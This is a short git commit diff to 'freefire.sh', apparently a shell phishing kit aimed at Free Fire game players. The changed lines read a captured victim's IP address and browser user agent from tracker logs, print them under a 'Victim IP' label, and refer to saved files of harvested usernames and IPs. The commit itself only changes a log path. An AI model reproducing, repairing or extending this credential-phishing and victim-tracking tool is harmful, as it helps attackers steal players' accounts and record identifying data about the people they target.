6553a38900e83c0a23d70b3fa2243cfa41a5899e
Uni-Creator <73036098+Uni-Creator@users.noreply.github.com>
2020-10-21 22:23:45 +0530

    Update freefire.sh

--- freefire.sh
+++ freefire.sh
@@ -122,7 +122,7 @@ touch $server/saved.usernames.txt
 
 ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
 #IFS=$'\n'
-ua=$(grep 'User-Agent:' $server/iptracker.log | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' iptracker.log | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
 #printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" "$server"
